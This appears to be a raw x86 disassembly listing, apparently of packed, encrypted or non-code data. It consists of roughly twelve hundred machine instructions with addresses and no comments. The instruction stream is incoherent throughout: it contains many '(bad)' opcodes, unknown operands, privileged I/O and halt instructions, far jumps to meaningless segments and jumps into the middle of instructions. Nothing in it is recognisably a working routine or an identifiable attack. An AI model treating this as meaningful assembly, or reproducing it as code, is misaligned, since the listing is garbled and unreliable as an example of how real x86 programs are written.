  4385e8:	cwde   
  4385e9:	and    dl,BYTE PTR ds:[edx+0x3e]
  4385ed:	adc    eax,0xf66d98dc
  4385f2:	mov    edi,0xabe96a59
  4385f7:	push   esp
  4385f8:	shl    BYTE PTR [edx+0x29],1
  4385fb:	jno    0x4385d1
  4385fd:	pop    ss
  4385fe:	and    ah,BYTE PTR [eax-0x74]
  438601:	mov    WORD PTR ds:0xe700c155,cs
  438607:	mov    esp,0x8f5c005e
  43860c:	fcom   DWORD PTR [edi-0xb]
  43860f:	cdq    
  438610:	jae    0x4385ea
  438612:	cmp    al,0xef
  438614:	js     0x438627
  438616:	jnp    0x4385f5
  438618:	jge    0x4385f2
  43861a:	adc    al,0xb5
  43861c:	or     eax,0xb51400db
  438621:	mov    BYTE PTR [ebp+0x24],bl
  438624:	gs retf 0xa4e8
  438628:	ja     0x438624
  43862a:	inc    DWORD PTR [edi-0x5ce98c4c]
  438630:	fld    QWORD PTR [eax-0x77d0500]
  438636:	push   ebp
  438637:	mov    esp,0xf6ffd092
  43863c:	rol    BYTE PTR [edi],0x40
  43863f:	or     ecx,DWORD PTR [edx+esi*8-0x77]
  438643:	push   esi
  438644:	mov    cl,0x75
  438646:	dec    ebp
  438647:	fistp  WORD PTR [eax]
  438649:	jle    0x438611
  43864b:	lock jmp 0x657d:0x9c8bc025
  438653:	jecxz  0x4386b1
  438655:	dec    esp
  438656:	cld    
  438657:	cmp    al,0x4c
  438659:	mov    eax,0xca34e8
  43865e:	add    BYTE PTR [eax-0x2c97e37d],cl
  438664:	idiv   BYTE PTR [eax+eax*1]
  438667:	adc    ebp,DWORD PTR [eax]
  438669:	stos   DWORD PTR es:[edi],eax
  43866a:	add    BYTE PTR [ebx+0xd45465],cl
  438670:	push   ss
  438671:	jbe    0x4386d8
  438673:	aas    
  438674:	fnstsw WORD PTR [ebp+0x47]
  438677:	jg     0x438654
  438679:	ror    DWORD PTR [ebx+0x15cf3],0x62
  438680:	inc    edx
  438681:	mov    edi,eax
  438683:	add    dh,dh
  438685:	pop    eax
  438686:	cmp    DWORD PTR [eax+0x442de],0x76
  43868d:	shl    BYTE PTR [ebx-0x7a767176],1
  438693:	jae    0x4386bf
  438695:	ret    
  438696:	idiv   bh
  438698:	rcl    DWORD PTR ds:0x436e428c,1
  43869e:	aas    
  43869f:	push   eax
  4386a0:	xor    eax,0xdbc88b94
  4386a5:	hlt    
  4386a6:	pusha  
  4386a7:	sbb    DWORD PTR [ebx],0x16
  4386aa:	aam    0x84
  4386ac:	jl     0x4386f1
  4386ae:	push   edi
  4386af:	test   DWORD PTR [edx+esi*1-0x3243efd],ebx
  4386b6:	sub    BYTE PTR [edi-0x2749d59],al
  4386bc:	out    0x81,al
  4386be:	mov    al,0x20
  4386c0:	jnp    0x438707
  4386c2:	pop    es
  4386c3:	mov    cl,0x22
  4386c5:	pop    ebx
  4386c6:	or     DWORD PTR [ebp+0x22],edi
  4386c9:	inc    esp
  4386ca:	add    eax,ecx
  4386cc:	xor    dh,cl
  4386ce:	aaa    
  4386cf:	push   ebx
  4386d0:	push   0xffffffbb
  4386d2:	dec    ebx
  4386d3:	sbb    DWORD PTR [ebx+0x1f84df4d],0xffffffa6
  4386da:	test   BYTE PTR [eax],cl
  4386dc:	loope  0x4386e0
  4386de:	add    BYTE PTR [ebp-0x5e],bh
  4386e1:	inc    ebp
  4386e2:	mov    ecx,DWORD PTR [ebx-0x72]
  4386e5:	call   0x8b35:0x9c007d50
  4386ec:	push   ebx
  4386ed:	mov    dh,0xaa
  4386ef:	bound  edi,QWORD PTR [ebp+0x27]
  4386f2:	push   cs
  4386f3:	aaa    
  4386f4:	mov    al,0x63
  4386f6:	fwait
  4386f7:	adc    BYTE PTR ds:0x42a9d8a2,ch
  4386fd:	out    0xbd,eax
  4386ff:	adc    DWORD PTR [edx-0xef0aad7],eax
  438705:	lods   eax,DWORD PTR ds:[esi]
  438706:	inc    eax
  438707:	imul   DWORD PTR [esi+0x62]
  43870a:	fldcw  WORD PTR [ebx]
  43870c:	pop    es
  43870d:	(bad)  
  43870f:	loope  0x4386bc
  438711:	dec    ebp
  438712:	icebp  
  438713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438714:	add    edi,DWORD PTR [edx]
  438716:	jge    0x43874e
  438718:	add    esp,DWORD PTR [edx+0x62]
  43871b:	les    ecx,FWORD PTR [ecx-0x7e55f3b3]
  438721:	rcl    DWORD PTR [ebp-0x16],0x88
  438725:	cwde   
  438726:	adc    eax,0x59759863
  43872b:	jmp    0xaab8:0x9c5c6203
  438732:	pop    edx
  438733:	outs   dx,BYTE PTR ds:[esi]
  438734:	repz loope 0x438710
  438737:	jmp    0x2512f53f
  43873c:	add    DWORD PTR [eax],edx
  43873e:	popa   
  43873f:	sub    eax,0x64e3df5c
  438744:	dec    ebx
  438745:	jbe    0x43875a
  438747:	push   ebp
  438748:	add    BYTE PTR ds:0x143462,dh
  43874e:	fbld   TBYTE PTR [ecx+esi*2]
  438751:	iret   
  438752:	mov    ecx,0x4f23ed60
  438757:	push   ss
  438758:	jmp    0x67b7:0x11273b7
  43875f:	bound  ebx,QWORD PTR [ebp-0x662722f5]
  438765:	add    ebx,edx
  438767:	pushf  
  438768:	and    DWORD PTR ds:[ebx+0x66436add],0xd4811742
  438773:	in     eax,dx
  438774:	add    BYTE PTR [edx+0x19],al
  438777:	add    al,0xc1
  438779:	test   eax,0x115e5c22
  43877e:	jo     0x438716
  438780:	mov    DWORD PTR [esi+edi*1+0x2f1545d4],esp
  438787:	inc    ecx
  438788:	jno    0x4387c7
  43878a:	pop    esi
  43878b:	fld    st(2)
  43878d:	in     eax,dx
  43878e:	popa   
  43878f:	(bad)  
  438790:	in     al,0xa1
  438792:	pop    ebp
  438793:	fld    DWORD PTR [eax]
  438795:	call   0xfce2:0x624fa834
  43879c:	fs in  eax,dx
  43879e:	popa   
  43879f:	(bad)  [ebx-0x6969f628]
  4387a5:	sub    DWORD PTR [esi+0x5c],esp
  4387a8:	rcr    BYTE PTR [ebp+edx*8-0x4],1
  4387ac:	pop    esp
  4387ad:	jmp    0x438810
  4387af:	fld1   
  4387b1:	fadd   QWORD PTR [eax]
  4387b3:	and    BYTE PTR [ebx-0x8],dl
  4387b6:	ins    BYTE PTR es:[edi],dx
  4387b7:	mov    eax,ds:0x634308ca
  4387bc:	mov    cl,0xe9
  4387be:	sub    DWORD PTR [ecx-0x27],esp
  4387c1:	add    BYTE PTR [ebp+ebx*1-0x6],ch
  4387c5:	adc    BYTE PTR [ecx],bh
  4387c7:	fstp   QWORD PTR [ebp+ebx*1+0x5]
  4387cb:	pusha  
  4387cc:	fld    DWORD PTR [eax]
  4387ce:	sbb    DWORD PTR [edi-0x5e243b16],ebx
  4387d4:	push   ebp
  4387d5:	mov    eax,DWORD PTR [ecx-0xb07ae1e]
  4387db:	pop    ebp
  4387dc:	mov    edi,0x41d51fc
  4387e1:	fsubr  QWORD PTR [ebp+eiz*4-0x7]
  4387e5:	xor    al,0x41
  4387e7:	sbb    ecx,DWORD PTR [esi+0x18dd4ef6]
  4387ed:	or     BYTE PTR [eax],al
  4387ef:	push   cs
  4387f0:	mov    eax,ds:0x608b0000
  4387f5:	or     ecx,DWORD PTR [ebp-0x74f7c211]
  4387fb:	jp     0x438824
  4387fd:	push   ecx
  4387fe:	(bad)  
  4387ff:	mov    ebx,0xcfc083dd
  438804:	loope  0x43887b
  438806:	clc    
  438807:	jp     0x43880b
  438809:	mov    cl,0x0
  43880b:	jnp    0x4387e6
  43880d:	repnz inc esp
  43880f:	das    
  438810:	jmp    0x59029725
  438815:	add    DWORD PTR [eax],eax
  438817:	add    BYTE PTR [ebx],bh
  438819:	cmovae ecx,DWORD PTR [eax]
  43881c:	cmp    DWORD PTR [ebp+0x398f8d17],ecx
  438822:	cmp    al,0x50
  438824:	mov    al,0x9f
  438826:	call   0x11cc232
  43882b:	test   bl,bh
  43882d:	mov    DWORD PTR [edi],eax
  43882f:	mov    edx,DWORD PTR ds:0x3b244d62
  438835:	fs clc 
  438837:	push   ecx
  438838:	ins    BYTE PTR es:[edi],dx
  438839:	adc    BYTE PTR [ecx+0x8],dl
  43883c:	jle    0x4387db
  43883e:	jae    0x438806
  438840:	fst    QWORD PTR [edi]
  438842:	add    BYTE PTR [ecx],al
  438844:	dec    edi
  438845:	xchg   ebx,eax
  438846:	mov    eax,DWORD PTR [edi+ebx*1+0x4d]
  43884a:	dec    eax
  43884b:	mov    ebp,DWORD PTR [edx+eiz*2-0x2490db7b]
  438852:	add    BYTE PTR [eax],al
  438854:	repz xchg ecx,eax
  438856:	cmp    ch,bh
  438858:	push   esp
  438859:	pop    edx
  43885a:	shl    DWORD PTR [ebp-0x42],0x86
  43885e:	cmc    
  43885f:	pop    edx
  438860:	adc    al,dh
  438862:	mov    eax,DWORD PTR [edi+ebx*2+0x62fff67d]
  438869:	inc    edx
  43886a:	aam    0x84
  43886c:	xchg   esp,eax
  43886d:	call   0xd887:0x9b9df8dd
  438874:	fcomip st,st(7)
  438876:	mov    al,0x46
  438878:	loope  0x438881
  43887a:	(bad)  
  43887b:	jae    0x43887d
  43887d:	add    DWORD PTR [edi+0x1bf1fe37],edi
  438883:	xchg   DWORD PTR [edx],ecx
  438885:	adc    edi,eax
  438887:	std    
  438888:	mov    dl,BYTE PTR [esi]
  43888a:	or     BYTE PTR es:[esi+0xd],cl
  43888e:	jecxz  0x43885c
  438890:	or     esp,ecx
  438892:	fcos   
  438894:	jae    0x4388a6
  438896:	jmp    0x4b918144
  43889b:	xor    al,BYTE PTR [edx+0x5a]
  43889e:	ds test al,0x1e
  4388a1:	out    dx,eax
  4388a2:	add    eax,0xc7923be1
  4388a7:	dec    ecx
  4388a8:	call   0x47ca92
  4388ad:	fiadd  WORD PTR [ecx+0x4be90ea8]
  4388b3:	mov    DWORD PTR [esi+edi*1+0x32],edx
  4388b7:	xchg   edi,edi
  4388b9:	mov    bl,0xf3
  4388bb:	cmp    edx,DWORD PTR [eax+0x5a]
  4388be:	mov    ebp,0xcd547343
  4388c3:	mov    bh,0x23
  4388c5:	push   edx
  4388c6:	adc    dl,dl
  4388c8:	clc    
  4388c9:	push   edi
  4388ca:	push   0xe
  4388cc:	inc    eax
  4388cd:	bound  edi,QWORD PTR [ebp+0x31e70943]
  4388d3:	cmp    edi,ecx
  4388d5:	aad    0x66
  4388d7:	add    eax,0x3bbea92d
  4388dc:	(bad)  
  4388dd:	push   esp
  4388de:	lods   eax,DWORD PTR ds:[esi]
  4388df:	ds cmp eax,0xf4d8bd00
  4388e5:	mov    edi,0x8ee99967
  4388ea:	mov    dl,0x5d
  4388ec:	xor    esi,DWORD PTR [eax-0x242240a4]
  4388f2:	push   ds
  4388f3:	push   ebx
  4388f4:	fmul   QWORD PTR [edx]
  4388f6:	and    DWORD PTR [ecx],esi
  4388f8:	lea    edi,[edx]
  4388fa:	jno    0x438945
  4388fc:	fadd   st(3),st
  4388fe:	test   DWORD PTR [ebp-0x18d5efda],ebp
  438904:	test   eax,0xb717df03
  438909:	(bad)  [eax]
  43890b:	mov    al,0x68
  43890d:	aas    
  43890e:	or     bl,ch
  438910:	jmp    0xea21a518
  438915:	mov    ds,WORD PTR [esi+0x2280ddfd]
  43891b:	int    0xe4
  43891d:	in     al,0x84
  43891f:	in     eax,dx
  438920:	add    dl,BYTE PTR [eiz*8-0x61731268]
  438927:	std    
  438928:	icebp  
  438929:	mov    ch,BYTE PTR [ebp-0x17]
  43892c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43892d:	ret    
  43892e:	push   ecx
  43892f:	xlat   BYTE PTR ds:[ebx]
  438930:	jmp    0xf25aeb38
  438935:	add    edx,DWORD PTR [edi+0x62fffdd5]
  43893b:	stos   BYTE PTR es:[edi],al
  43893c:	bound  edi,QWORD PTR [ebx]
  43893e:	xchg   ecx,eax
  43893f:	(bad)  
  438941:	inc    ebx
  438942:	pop    es
  438943:	scas   eax,DWORD PTR es:[edi]
  438944:	jb     0x438907
  438946:	add    BYTE PTR [ecx-0x55],dl
  438949:	fidiv  DWORD PTR [ecx]
  43894b:	inc    edi
  43894c:	sbb    edx,DWORD PTR [esi]
  43894e:	retf   0xcd9d
  438951:	mov    ebp,0xc09d50cb
  438956:	mov    al,0x65
  438958:	retf   
  438959:	mov    dh,0x8c
  43895b:	and    esp,ebp
  43895d:	add    BYTE PTR [esi-0x2e],dh
  438960:	cmp    al,0xf5
  438963:	popf   
  438964:	loop   0x43895d
  438966:	cld    
  438967:	icebp  
  438968:	in     eax,0x40
  43896a:	jmp    0x6b1a29b
  43896f:	mov    al,ds:0xd7f9700d
  438974:	cmp    ah,ch
  438976:	or     ah,bh
  438978:	cwde   
  438979:	add    al,0x70
  43897b:	(bad)  
  43897c:	fsubp  st(3),st
  43897e:	out    0xb1,al
  438980:	push   ecx
  438981:	ins    DWORD PTR es:[edi],dx
  438982:	add    eax,0x990e5056
  438987:	dec    esi
  438988:	cdq    
  438989:	add    BYTE PTR [esi+eiz*1-0x3a],ah
  43898d:	adc    BYTE PTR [edx-0x65],ah
  438990:	fsubp  st(0),st
  438992:	dec    esi
  438993:	mov    ecx,DWORD PTR [esi-0x8]
  438996:	ins    BYTE PTR es:[edi],dx
  438997:	sahf   
  438998:	(bad)  
  438999:	fnstsw WORD PTR [ebx+0x39033ca1]
  43899f:	popa   
  4389a0:	scas   eax,DWORD PTR es:[edi]
  4389a1:	push   edi
  4389a2:	sub    esp,DWORD PTR [edx-0x27]
  4389a5:	dec    ebp
  4389a6:	jb     0x438a25
  4389a8:	aam    0xdc
  4389aa:	loope  0x4389ac
  4389ac:	out    0x44,al
  4389ae:	add    eax,0x8f5c56a
  4389b3:	jmp    0x2b1f8eee
  4389b8:	xor    BYTE PTR [ecx-0x1efdea78],ch
  4389be:	mov    DWORD PTR ds:0xc39e202,esp
  4389c4:	push   0xffffffc3
  4389c6:	push   ebx
  4389c7:	je     0x4389e6
  4389c9:	test   BYTE PTR [ecx+edx*4],0xb4
  4389cd:	jecxz  0x4389cf
  4389cf:	jmp    0x27b0a339
  4389d4:	out    dx,eax
  4389d5:	inc    ebx
  4389d6:	cmp    al,BYTE PTR [eax]
  4389d8:	jle    0x4389bb
  4389da:	jb     0x438a1d
  4389dc:	push   eax
  4389dd:	xchg   ebx,eax
  4389de:	add    BYTE PTR [edx-0x45],ch
  4389e1:	fs or  eax,0x261061b0
  4389e7:	leave  
  4389e8:	adc    ebx,DWORD PTR [ebp-0x25]
  4389eb:	dec    DWORD PTR [eiz*2-0x7df37a07]
  4389f2:	and    BYTE PTR [eax+0x931af],al
  4389f8:	adc    BYTE PTR [edx],bl
  4389fa:	and    al,0x10
  4389fc:	adc    BYTE PTR [ecx+0x6423076c],ch
  438a02:	adc    al,BYTE PTR [eax]
  438a04:	mov    eax,DWORD PTR [esp+eax*1]
  438a07:	call   0x4477f5
  438a0c:	lock mov al,ds:0xf100e0e8
  438a12:	adc    dl,bh
  438a14:	inc    esi
  438a15:	xor    BYTE PTR [eax-0x2778df4],al
  438a1b:	div    BYTE PTR [ecx]
  438a1d:	adc    BYTE PTR [edi+0x45],0x24
  438a21:	daa    
  438a22:	add    eax,0xdd4b1214
  438a27:	jle    0x4389ec
  438a29:	pushf  
  438a2a:	daa    
  438a2b:	dec    ebp
  438a2c:	mov    esp,DWORD PTR [esi]
  438a2e:	xor    esi,DWORD PTR [esi+0x45263b08]
  438a34:	push   ebp
  438a35:	push   ebp
  438a36:	and    BYTE PTR [ebp-0xf],bh
  438a39:	sbb    BYTE PTR [ebp+eax*2+0x11397788],dh
  438a40:	mov    esp,DWORD PTR [ebp-0x27]
  438a43:	pop    esi
  438a44:	(bad)  
  438a45:	clc    
  438a46:	popf   
  438a47:	call   0xfa4ca771
  438a4c:	mov    esi,DWORD PTR ds:0x626a45dd
  438a52:	addr16 hlt 
  438a54:	(bad)  
  438a55:	jmp    0xb455afb4
  438a5a:	push   edi
  438a5b:	xor    BYTE PTR [ebp+0x65d33e34],al
  438a61:	lds    edx,FWORD PTR [ebx+0x5aba8545]
  438a67:	clc    
  438a68:	fnstenv [ebp-0x180f7449]
  438a6e:	popf   
  438a6f:	mov    al,0x1e
  438a71:	fbld   TBYTE PTR [edi-0x18ffe550]
  438a77:	test   al,0xb0
  438a79:	push   ss
  438a7a:	sub    al,0xcb
  438a7c:	inc    edi
  438a7d:	test   DWORD PTR [edi+0x6d23d8da],ebx
  438a83:	mov    ?,edi
  438a85:	out    0xda,eax
  438a87:	inc    edi
  438a88:	das    
  438a89:	stc    
  438a8a:	mov    DWORD PTR ds:0xef2a602c,edi
  438a90:	das    
  438a91:	xchg   BYTE PTR [edx-0x4117b645],cl
  438a97:	int3   
  438a98:	das    
  438a99:	stc    
  438a9a:	jmp    0xe896afa5
  438a9f:	dec    esi
  438aa0:	das    
  438aa1:	test   DWORD PTR [edx+ebx*8],edx
  438aa4:	mov    esi,0x8a3f3d95
  438aa9:	mov    ebp,0x54d99895
  438aae:	mov    eax,DWORD PTR [ebx+0x3e7e7c83]
  438ab4:	clc    
  438ab5:	test   BYTE PTR [eax],ch
  438ab7:	mov    ah,0x5
  438ab9:	scas   al,BYTE PTR es:[edi]
  438aba:	arpl   WORD PTR [edx],bp
  438abc:	test   al,0xf8
  438abe:	or     eax,0x53fe2b8f
  438ac3:	add    BYTE PTR [edx+0x4],0x62
  438ac7:	ret    
  438ac8:	scas   eax,DWORD PTR es:[edi]
  438ac9:	and    ebx,DWORD PTR [esi-0x27]
  438acc:	in     eax,0x8a
  438ace:	and    al,0xcb
  438ad0:	lock icebp 
  438ad2:	pop    ss
  438ad3:	inc    ecx
  438ad4:	sub    eax,0x834fdb37
  438ad9:	add    DWORD PTR [eax],eax
  438adb:	test   BYTE PTR [ecx],bl
  438add:	lods   al,BYTE PTR ds:[esi]
  438ade:	dec    ebp
  438ae0:	dec    esi
  438ae1:	out    dx,al
  438ae2:	fbld   TBYTE PTR [ecx+0xc]
  438ae5:	mov    eax,ds:0x28da0fd1
  438aea:	sub    al,0xf9
  438aec:	dec    esi
  438aed:	pop    edi
  438aee:	ss in  al,dx
  438af0:	aam    0xe9
  438af2:	ss cs cmc 
  438af5:	in     eax,0xf2
  438af7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438af8:	stos   BYTE PTR es:[edi],al
  438af9:	sbb    edx,DWORD PTR [edx+0x55]
  438afc:	inc    ecx
  438afd:	xchg   ebx,eax
  438afe:	xor    eax,0xff2c4f8b
  438b03:	test   DWORD PTR [eax+0x3e],ebx
  438b06:	jecxz  0x438b87
  438b08:	dec    edi
  438b09:	jmp    0xbe8a:0xb4ab9cf2
  438b10:	hlt    
  438b11:	lds    eax,FWORD PTR [ecx]
  438b13:	(bad)  
  438b14:	fnstenv [esi+0x3164548a]
  438b1a:	sbb    BYTE PTR [ecx-0x27],0xee
  438b1e:	jge    0x438b99
  438b20:	fsubr  st,st(1)
  438b22:	add    ebx,edi
  438b24:	xchg   esi,eax
  438b25:	in     eax,0x9d
  438b27:	je     0x438b0a
  438b29:	(bad)  
  438b2a:	jg     0x438b81
  438b2c:	fsubr  st,st(1)
  438b2e:	add    edx,DWORD PTR [eax-0x49f02957]
  438b34:	jmp    0x4e9:0x519f0429
  438b3b:	loope  0x438ba9
  438b3d:	jmp    0x27:0x62620003
  438b44:	fst    DWORD PTR [ebp-0x56a5f300]
  438b4a:	and    DWORD PTR [ebx-0x600ebed1],0x37
  438b51:	push   eax
  438b52:	jge    0x438afd
  438b54:	pop    edi
  438b55:	push   ebp
  438b56:	lock jmp 0x35c964bd
  438b5c:	ret    0xe8f6
  438b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438b60:	cmp    eax,0x1e65f852
  438b65:	lds    esp,FWORD PTR [ebp+0x62]
  438b68:	stos   BYTE PTR es:[edi],al
  438b69:	cli    
  438b6a:	adc    al,0x81
  438b6c:	inc    eax
  438b6d:	ret    0x66f6
  438b70:	fisttp DWORD PTR [ecx+0x7e]
  438b73:	push   edi
  438b74:	repnz test eax,0xf6bdbd85
  438b7a:	dec    esi
  438b7b:	bound  ebp,QWORD PTR [eax]
  438b7d:	inc    ecx
  438b7e:	arpl   WORD PTR [edx*2-0x2dd681b0],ax
  438b85:	cdq    
  438b86:	xor    ebp,DWORD PTR [ecx]
  438b88:	xchg   esi,eax
  438b89:	sahf   
  438b8a:	push   eax
  438b8b:	cdq    
  438b8c:	loop   0x438bcb
  438b8e:	add    eax,0x24fa9a74
  438b93:	push   ds
  438b94:	mov    dl,0xfa
  438b96:	cmp    BYTE PTR [eax+0x22],ah
  438b99:	cli    
  438b9a:	xor    BYTE PTR [ecx-0x3ee36b18],bh
  438ba0:	fcom   DWORD PTR [esp+ebx*1-0x3386ff43]
  438ba7:	retf   
  438ba8:	hlt    
  438ba9:	jbe    0x438c00
  438bab:	shl    DWORD PTR [ebp+0x66],0x50
  438baf:	cs fpatan 
  438bb2:	cdq    
  438bb3:	add    BYTE PTR [ebp+eiz*8-0x7],ch
  438bb7:	and    al,0x38
  438bb9:	arpl   WORD PTR ss:[ebp+0x5],ax
  438bbd:	jp     0x438c00
  438bbf:	mov    al,BYTE PTR [eax]
  438bc1:	rol    DWORD PTR [esi],1
  438bc3:	cli    
  438bc4:	mov    al,bl
  438bc6:	push   esi
  438bc7:	inc    ebp
  438bc8:	and    al,0x1b
  438bca:	add    ah,BYTE PTR [edx+0x7e04c6c7]
  438bd0:	into   
  438bd1:	shr    DWORD PTR [ebx],cl
  438bd3:	(bad)  
  438bd4:	inc    esp
  438bd6:	push   esi
  438bd7:	inc    ebp
  438bd8:	and    al,0xd7
  438bda:	add    DWORD PTR [esi],edi
  438bdc:	mul    ah
  438bde:	add    al,0xde
  438be0:	sbb    eax,0xfff7d973
  438be5:	mov    ebx,0xa7243d56
  438bea:	sub    ecx,edi
  438bec:	ja     0x438bad
  438bee:	add    al,0x14
  438bf0:	mov    al,ds:0x47f819a9
  438bf5:	inc    esi
  438bf6:	fcomi  st,st(7)
  438bf8:	dec    DWORD PTR [ebx-0x754cae84]
  438bfe:	int    0xcd
  438c00:	je     0x438bec
  438c02:	dec    eax
  438c03:	int    0x8b
  438c05:	dec    eax
  438c06:	pop    ecx
  438c07:	cld    
  438c08:	add    al,BYTE PTR [eax]
  438c0a:	mov    ebp,0x45558bea
  438c0f:	push   edi
  438c10:	dec    edx
  438c11:	or     BYTE PTR [ebx+0x21],dl
  438c14:	out    0xff,al
  438c16:	inc    esp
  438c17:	popa   
  438c18:	icebp  
  438c19:	test   DWORD PTR [ebp+0x7c],edi
  438c1c:	xor    DWORD PTR [edx+0x4a],ebp
  438c1f:	sub    dl,BYTE PTR [edx-0x73]
  438c22:	jmp    FWORD PTR [esp+esi*1]
  438c25:	push   eax
  438c26:	call   0xd7598554
  438c2b:	jmp    0x110b8c70
  438c30:	and    DWORD PTR [edi],ecx
  438c32:	in     al,0x94
  438c34:	jl     0x438c11
  438c36:	mov    ?,edx
  438c38:	and    eax,0xce1162c9
  438c3d:	dec    esi
  438c3e:	jmp    0x46900ec7
  438c43:	dec    esi
  438c44:	sbb    al,0x1e
  438c46:	loopne 0x438bd4
  438c48:	xor    al,0x83
  438c4a:	and    dh,BYTE PTR [ecx+ebx*4]
  438c4d:	mov    ebp,0xa7156ce9
  438c52:	retf   0x3473
  438c55:	pop    edx
  438c56:	test   DWORD PTR ds:0xc139bd77,ecx
  438c5c:	dec    eax
  438c5d:	and    BYTE PTR [eax+0x42],ah
  438c60:	add    al,0xbe
  438c62:	inc    dx
  438c64:	sbb    al,0x5
  438c66:	xchg   bl,cl
  438c68:	xor    edi,DWORD PTR [esi+0x51cf4266]
  438c6e:	add    BYTE PTR [edx+0x56],cl
  438c71:	pusha  
  438c72:	inc    eax
  438c73:	bound  ebp,QWORD PTR [eax]
  438c75:	add    al,0x2e
  438c77:	mov    DWORD PTR [ebx-0x7d8d5fe7],ebp
  438c7d:	add    al,0x85
  438c7f:	xchg   edx,eax
  438c80:	mov    ch,0x3a
  438c82:	je     0x438cd4
  438c84:	(bad)  
  438c85:	adc    DWORD PTR [edx+esi*2+0x8510482],ecx
  438c8c:	inc    edx
  438c8d:	pop    ss
  438c8e:	or     eax,0x9019fb0d
  438c93:	push   edx
  438c94:	add    BYTE PTR [ebx+eax*4],0xa2
  438c98:	or     dx,WORD PTR [eax+0x5d]
  438c9c:	dec    ebp
  438c9d:	jl     0x438caf
  438c9f:	mov    ds:0x4d51db42,al
  438ca4:	out    dx,eax
  438ca5:	ja     0x438c9f
  438ca7:	fisttp WORD PTR [edx-0x47]
  438caa:	jecxz  0x438c3e
  438cac:	ins    BYTE PTR es:[edi],dx
  438cad:	outs   dx,DWORD PTR ds:[esi]
  438cae:	push   DWORD PTR [eiz*1-0x265def78]
  438cb5:	jmp    0xaba3188c
  438cba:	into   
  438cbb:	(bad)  
  438cbd:	jmp    0xde391af4
  438cc2:	mul    BYTE PTR [edi+eiz*4]
  438cc5:	jnp    0x438ccb
  438cc7:	cli    
  438cc8:	inc    eax
  438cc9:	mov    dh,0x32
  438ccb:	sti    
  438ccc:	push   ss
  438ccd:	out    0x3,al
  438ccf:	sti    
  438cd0:	(bad)  
  438cd1:	std    
  438cd2:	pop    es
  438cd3:	add    BYTE PTR [edi],bh
  438cd5:	and    bh,BYTE PTR [esi+esi*8]
  438cd8:	pop    ss
  438cd9:	inc    ecx
  438cda:	scas   eax,DWORD PTR es:[edi]
  438cdb:	das    
  438cdc:	fisttp DWORD PTR [ebx-0x54]
  438cdf:	pop    es
  438ce0:	bound  esp,QWORD PTR [esi+0x3d4d1f62]
  438ce6:	retf   0x6207
  438ce9:	fldenv [eax+eax*4-0x64]
  438ced:	dec    edi
  438cee:	outs   dx,DWORD PTR ds:[esi]
  438cef:	xor    ah,BYTE PTR [edi]
  438cf1:	mov    ds:0x40bc7f0e,eax
  438cf6:	stos   DWORD PTR es:[edi],eax
  438cf7:	lea    ebp,[ebx-0x33949ab5]
  438cfd:	fldl2t 
  438cff:	add    ebx,edi
  438d01:	sbb    eax,DWORD PTR [edx+0x27]
  438d04:	in     al,0x4a
  438d06:	aas    
  438d07:	imul   BYTE PTR [esi+0x21ab2a55]
  438d0d:	mov    edi,0x312980d5
  438d12:	cdq    
  438d13:	rcl    DWORD PTR [edx],cl
  438d15:	test   al,0xba
  438d17:	xor    dl,BYTE PTR [ecx+0x51]
  438d1a:	stc    
  438d1b:	ret    
  438d1c:	pop    ebp
  438d1d:	push   esi
  438d1e:	sub    dh,BYTE PTR [ecx-0x302f4c7b]
  438d24:	mov    al,ds:0xc6ff7623
  438d29:	push   ecx
  438d2a:	into   
  438d2b:	mov    al,0x81
  438d2d:	push   es
  438d2e:	add    DWORD PTR [eax],esp
  438d30:	or     edx,DWORD PTR [ebp+eax*2-0x5c]
  438d34:	cdq    
  438d35:	pop    esi
  438d36:	rol    DWORD PTR ds:[eax],0xe
  438d3a:	test   DWORD PTR [ebp+0x4f],esi
  438d3d:	sub    cl,BYTE PTR [ebx-0x7b]
  438d40:	fs scas al,BYTE PTR es:[edi]
  438d42:	dec    esi
  438d43:	clc    
  438d44:	into   
  438d45:	outs   dx,BYTE PTR ds:[esi]
  438d46:	ins    BYTE PTR es:[edi],dx
  438d47:	cmp    al,0xc4
  438d49:	push   ebx
  438d4a:	push   esi
  438d4b:	shr    esi,0xd4
  438d4e:	sbb    DWORD PTR [ebp-0x57],edi
  438d51:	lods   eax,DWORD PTR ds:[esi]
  438d52:	shl    DWORD PTR [ebx],cl
  438d54:	test   eax,0xb97e53b8
  438d59:	xor    eax,0x8060f850
  438d5e:	dec    edx
  438d5f:	clc    
  438d60:	jmp    0x9326e3b9
  438d65:	xchg   ebx,eax
  438d66:	push   eax
  438d67:	mov    ecx,esp
  438d69:	mov    eax,ds:0xde836d93
  438d6e:	inc    edx
  438d6f:	mov    ds:0x7e5e5e29,eax
  438d74:	cdq    
  438d75:	jge    0x438dc7
  438d77:	clc    
  438d78:	mov    ecx,0xf8a8e672
  438d7d:	mov    eax,ds:0x99d4834a
  438d82:	dec    ebx
  438d83:	outs   dx,BYTE PTR ds:[esi]
  438d84:	or     ecx,DWORD PTR [edi]
  438d86:	xchg   edi,eax
  438d87:	cld    
  438d88:	into   
  438d89:	js     0x438d6d
  438d8b:	ins    BYTE PTR es:[edi],dx
  438d8c:	jecxz  0x438d1f
  438d8e:	push   ecx
  438d8f:	push   cs
  438d90:	mov    ecx,0x6200994f
  438d95:	mov    dh,dl
  438d97:	add    ebp,DWORD PTR [ecx]
  438d99:	mov    ds,WORD PTR [edi-0x7a]
  438d9c:	cmp    DWORD PTR [eax],eax
  438d9e:	lea    edx,[eax-0x8]
  438da1:	add    DWORD PTR [edx+0x6f0ef67a],esp
  438da7:	aam    0x85
  438da9:	add    dh,cl
  438dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438dac:	sti    
  438dad:	(bad)  
  438dae:	cmp    al,0xee
  438db0:	neg    edi
  438db2:	sub    al,0x9
  438db4:	pop    edx
  438db5:	pop    esi
  438db6:	ror    BYTE PTR [esi],1
  438db8:	mov    bh,0x4
  438dba:	cmp    esp,DWORD PTR [ebx]
  438dbc:	jge    0x438daa
  438dbe:	mov    dl,dh
  438dc0:	clc    
  438dc1:	sbb    DWORD PTR [edi],0x4a
  438dc4:	mov    ecx,DWORD PTR [edi+eiz*2-0x1f]
  438dc8:	inc    ebp
  438dc9:	call   0x3ee59d
  438dce:	mov    cs,WORD PTR [edx-0x23dcf7dc]
  438dd4:	mov    esi,edi
  438dd6:	mov    esp,0xf274c151
  438ddb:	in     eax,dx
  438ddc:	or     al,0xde
